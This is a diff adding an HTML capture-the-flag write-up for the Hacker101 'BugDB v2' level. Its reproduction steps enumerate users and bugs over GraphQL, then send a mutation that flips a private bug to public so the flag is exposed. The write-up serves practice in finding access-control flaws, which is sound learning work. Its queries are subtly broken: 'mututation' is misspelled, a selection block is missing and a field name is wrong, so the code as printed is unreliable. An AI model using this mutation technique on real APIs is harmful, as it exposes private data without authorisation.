@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="bugdb v2">
+        <title>BugDB V1</title>
+        <link rel="stylesheet" href="/styles/hacker101.css">
+    </head>
+    <body>
+        <header class="ha-header">
+            <nav class="sides">
+                <p>Difficulty: Easy</p>
+                <h1 class="ha-center">
+                    BugDB v2
+                </h1>
+                <p>
+                    <a class="right-side" href="./">
+                        &lt; Go to previous page
+                    </a>
+                </p>
+            </nav>
+            <hr>
+        </header>
+        <h2>
+            Flag 0:
+        </h2>
+        <div class="sides">
+            <section class="right-side" id="flag0">
+                <p>Hints</p>
+                <ul>
+                    <li>
+                        What has changed since last version?
+                    </li>
+                    <li>
+                        What do the queries tell you?
+                    </li>
+                    <li>
+                        Have you tried a mutation?
+                    </li>
+                </ul>
+            </section>
+            <section class="left-side">
+                <p>
+                    <strong>
+                        Title:
+                    </strong>
+                    Manuplation of the non existence data
+                </p>
+                <ul>
+                    <li>
+                        Attack Vector: Network
+                    </li>
+                    <li>
+                        Attack Complexity: Low
+                    </li>
+                    <li>
+                        Privileges Required: None
+                    </li>
+                    <li>
+                        User Interaction: Required
+                    </li>
+                    <li>
+                        Scope: Unchanged
+                    </li>
+                    <li>
+                        Confidentiality: High
+                    </li>
+                    <li>
+                        Integrity: High
+                    </li>
+                    <li>
+                        Availablility: None
+                    </li>
+                </ul>
+            </section>
+        </div>
+        <h2>
+            Reproduction Steps:
+        </h2>
+        <ol>
+            <li>
+                Query all users by running the following query
+                <pre>
+                    <code>
+                        query users {
+                            allUsers {
+                                edge {
+                                    node {
+                                        id: username
+                                    }
+                                }
+                            }
+                        }
+                    </code>
+                </pre>
+            </li>
+            <li>
+                Then query all bugs by running the following query 
+                <pre>
+                    <code>
+                        query bugs {
+                            allBugs
+                            id
+                            reporter {
+                                id: username
+                            }
+                            text
+                            private
+                            reporterId
+                        }
+                    </code>
+                </pre>
+            </li>
+            <li>
+                Then modify the non existence data
+                <pre>
+                    <code>
+                        mututation addBug {
+                            modifyBug (id: 2, private: false) {
+                                ok
+                            }
+                        }
+                    </code>
+                </pre>
+            </li>
+            <li>
+                Query all bugs the data will return with the flag.
+            </li>
+        </ol>
+        <h2>
+            Impact Statement:
+        </h2>
+        <p>
+            The ability to modify the non existence data.
+        </p>
+        <hr>
+    </body>
+</html>
